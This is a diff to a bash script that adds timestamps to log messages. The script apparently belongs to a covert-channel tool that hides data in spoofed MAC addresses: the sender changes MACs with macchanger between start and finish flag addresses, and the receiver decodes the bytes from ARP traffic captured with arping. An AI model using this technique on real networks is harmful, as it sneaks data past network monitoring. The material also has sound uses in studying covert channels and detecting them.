@@ -18,7 +18,8 @@ then
 			Defdelay=3
 		fi
 	# start flag
-	echo "[>] Changing MAC Address to start ... (Delay 5 sec)"
+	Time=`date '+%d/%m/%Y %H:%M:%S'`
+	echo "[>] [$Time] Changing MAC Address to start ... (Delay 5 sec)"
 	sudo ifconfig $3 down; sudo macchanger -m  00:ff:ff:ff:ff:ff $3 | grep New; sudo ifconfig $3 up; sleep 5;
 	echo
 
@@ -34,7 +35,8 @@ then
 		echo "[!] your MAC Address is:" 00:"${Exfil::-1}"
 		#echo "sudo ifconfig eth0 down; sudo macchanger -m " 00:"${Exfil::-1}" " eth0; sudo ifconfig eth0 up; sleep x;"
 		tput setaf 9;
-		echo "[>] [$counter] MAC Changing Done , Delay is :" $Defdelay "(sec)"	
+		Time=`date '+%d/%m/%Y %H:%M:%S'`
+		echo "[>] [$counter] [$Time] MAC Changing Done , Delay is :" $Defdelay "(sec)"	
 		sudo ifconfig $3 down;sudo macchanger -m  00:"${Exfil::-1}" $3 | grep New; sudo ifconfig $3 up; sleep $Defdelay;
 		((counter++))
 		echo ------------------
@@ -42,7 +44,8 @@ then
 	done
 		# finish flag
 		echo
-		echo "[>] Changing MAC Address to (finish flag)"
+		Time=`date '+%d/%m/%Y %H:%M:%S'`
+		echo "[>] [$Time] Changing MAC Address to (finish flag)"
 		sudo ifconfig $3 down; sudo macchanger -m  00:ff:00:ff:00:ff $3 | grep New; sudo ifconfig $3 up; sleep $Defdelay;
 		echo
 
@@ -56,7 +59,8 @@ then
 	# some arping switches changed by old/new versions
 	arping -I $2 $3 -w 0 -b > ARPData.txt &
 	init=0
-	echo "[!] Scanning Target [$3] via Arping by delay ($4)."
+	Time=`date '+%d/%m/%Y %H:%M:%S'`
+	echo "[!] [$Time] Scanning Target [$3] via Arping by delay ($4)."
 	while true; do
 	String=`cat ARPData.txt | grep -e 00:ff:00:ff:00:ff -e 00:FF:00:FF:00:FF`
 	#printf '\u2591\n'
@@ -67,8 +71,9 @@ then
         Startflag=`cat ARPData.txt | grep -e 00:ff:ff:ff:ff:ff -e 00:FF:FF:FF:FF:FF`
 		if (( `echo ${#Startflag}` !=0 ))
 		then
-		tput setaf 6;	
-		echo "[!] Start flag MAC Address Detected :" 00:ff:ff:ff:ff:ff
+		tput setaf 6;
+		Time=`date '+%d/%m/%Y %H:%M:%S'`	
+		echo "[!] [$Time] Start flag MAC Address Detected :" 00:ff:ff:ff:ff:ff
 		((init++))
 		fi	
 	fi				
@@ -76,8 +81,9 @@ then
         	if (( `echo ${#String}` !=0 ))
 		then
 		killall arping
-		tput setaf 6;	
-		echo "[!] Finish flag MAC Address Detected :" 00:ff:00:ff:00:ff
+		tput setaf 6;
+		Time=`date '+%d/%m/%Y %H:%M:%S'`	
+		echo "[!] [$Time] Finish flag MAC Address Detected :" 00:ff:00:ff:00:ff
 		break
 		fi
 	sleep 1
@@ -108,8 +114,9 @@ then
 	echo "[!] Your Injected Bytes via Mac Addresses: "
 	echo $FinalPayload
 	echo
-	tput setaf 6;	
-	echo "[!] Your Data : "
+	tput setaf 6;
+	Time=`date '+%d/%m/%Y %H:%M:%S'`	
+	echo "[!] [$Time] Your Data : "
 	echo
 	echo "${FinalPayload:17:-17}" | xxd -r -p
 	echo
